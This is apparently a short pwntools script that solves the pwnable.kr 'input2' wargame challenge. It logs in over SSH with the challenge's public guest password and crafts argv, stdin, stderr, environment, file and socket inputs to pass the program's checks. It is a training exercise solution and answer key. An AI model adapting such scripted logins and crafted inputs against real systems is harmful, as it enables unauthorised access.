from pwn import *
#from time import sleep
s = ssh(host='pwnable.kr', user='input2', port=2222, password='guest')
args = ['A'] * 100
args[0] = '/home/input2/input'
args[ord('A')] = '\x00'
args[ord('B')] = '\x20\x0a\x0d'
args[ord('C')] = '\x11\x11'
print(args)
print(s.system('mkdir -p /tmp/input2files').recvall())
print(s.system('echo -e "\\x00\\x0a\\x00\\xff" > /tmp/input2files/stdin').recvall())
print(s.system('echo -e "\\x00\\x0a\\x02\\xff" > /tmp/input2files/stderr').recvall())
#print(s.system('echo -e "\\x00\\x00\\x00\\x00 > /tmp/input2files/tmp').recvall())
s.write('/tmp/input2files/\x0a', '\x00\x00\x00\x00')
p = s.process(argv=args, 
							stdin='/tmp/input2files/stdin', 
							stderr='/tmp/input2files/stderr',
							env={'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'},
							cwd='/tmp/input2files')
#sleep(5) # just in case
s['echo -e "\\xDE\\xAD\\xBE\\xEF" | nc localhost 4369'] # 0x1111 = 4369
p.interactive()
#s.interactive()
